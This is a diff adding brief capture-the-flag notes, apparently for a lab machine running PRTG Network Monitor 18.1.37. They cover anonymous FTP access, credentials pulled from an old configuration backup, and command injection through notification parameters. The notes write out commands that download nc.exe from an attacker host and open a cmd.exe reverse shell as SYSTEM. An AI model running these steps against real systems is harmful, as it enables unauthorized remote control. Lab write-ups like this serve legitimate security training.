@@ -1,0 +1,122 @@
+nmap
+---------------
+ftp (Anonymous login permitted)
+Windows RPC
+SMB
+Windows server 2008
+
+
+
+
+
+ftp
+ftp_2
+user_flag
+website_explore_1
+
+
+
+
+
+
+website_explore_2
+------------------
+PRTG Network Monitor 18.1.37.13946
+
+
+
+research1
+-------------
+Research into PRTG Network Monitor 18.1.37 led me to this notice
+https://www.paessler.com/about-prtg-17-4-35-through-18-1-37
+"
+Delete the following automatically generated copies of the configuration file if they exist:  
+• C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old
+"
+
+ftp_3
+------------
+ftp back in and navigate to C:\ProgramData\Paessler\PRTG Network Monitor\
+and locate a file called PRTG Configuration.old.bak
+
+
+config_file
+-------------
+Examining the file and searching for "password>" yields:
+we have db credentials now
+prtgadmin/PrTg@dmin2018
+these credentials fail however. since these are old backups, a password guess of PrTg@dmin2019 logs in successfully
+
+
+
+
+
+website_access
+
+
+
+
+research2
+--------------------
+full credit to
+https://www.codewatch.org/blog/?p=453
+notification parameters are not sanitized
+
+
+
+notification_1
+----------------
+navigate to notification creation center
+
+
+
+notification_2
+notification_3
+
+
+
+server
+-------------
+set up a simple python3 server to serve a netcat executable
+
+
+program_1
+--------------
+Invoke-WebRequest http://10.10.14.19:8000/nc.exe -outfile C:\Users\Public\Downloads\nc.exe
+
+
+
+trigger_notification_1
+---------------------
+can trigger the notification on demand
+
+server2
+-------------
+request went through
+
+
+ftp_4
+--------
+file is where it should be
+
+
+
+
+trigger_notification_2
+---------------------
+C:\Users\Public\Downloads\nc.exe 10.10.14.19 7777 -e cmd.exe
+
+
+netcat
+-------
+set up netcat listener on port 7777
+
+
+
+netcat2
+---------
+recieve connection upon triggering the notification
+nt authority\system shell
+
+
+root_flag
